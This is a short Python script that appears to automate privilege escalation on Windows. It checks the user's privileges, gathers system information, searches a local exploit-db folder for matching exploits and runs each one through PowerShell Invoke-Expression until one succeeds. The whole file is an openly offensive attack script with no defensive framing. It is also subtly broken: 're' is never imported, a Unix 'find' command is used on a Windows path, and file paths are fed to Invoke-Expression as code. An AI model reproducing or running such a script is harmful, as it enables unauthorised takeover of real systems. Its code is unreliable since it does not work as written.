import os
import subprocess
import sys

def check_privileges():
    """
    Check the current user's privileges
    """
    try:
        output = subprocess.check_output("whoami /priv", shell=True)
        privileges = output.decode('utf-8')
        if "SeDebugPrivilege" in privileges:
            return "admin"
        else:
            return "user"
    except subprocess.CalledProcessError:
        return None

def search_exploits(exploit_db_path):
    """
    Search exploit-db for matching exploits based on system info
    """
    try:
        output = subprocess.check_output("systeminfo", shell=True)
        system_info = output.decode('utf-8')
        os_info = re.search("OS Name:.*\nOS Version:.*\n", system_info).group(0)
        os_name = os_info.split(": ")[1].strip()
        os_version = os_info.split(": ")[2].strip()
        output = subprocess.check_output(f"find {exploit_db_path} -type f -name '*.txt' -exec grep -il '{os_name}.*{os_version}' {{}} +", shell=True)
        exploit_files = output.decode('utf-8').splitlines()
        return exploit_files
    except subprocess.CalledProcessError:
        return None

def exploit(exploit_file):
    """
    Run the given exploit file
    """
    try:
        subprocess.check_output(f"powershell -c 'Invoke-Expression \"{exploit_file}\"'", shell=True)
        print(f"Exploit successful: {exploit_file}")
        return True
    except subprocess.CalledProcessError:
        print(f"Exploit failed: {exploit_file}")
        return False

def main():
    # Check current user's privileges
    privileges = check_privileges()
    if privileges == "admin":
        print("Already running as administrator, no need to escalate privileges")
        return

    # Search for exploits
    exploit_db_path = "C:\\exploit-db"
    exploit_files = search_exploits(exploit_db_path)
    if not exploit_files:
        print("No exploits found")
        return

    # Run exploits
    for exploit_file in exploit_files:
        if exploit(exploit_file):
            return

    print("No successful exploits found")

if __name__ == "__main__":
    main()
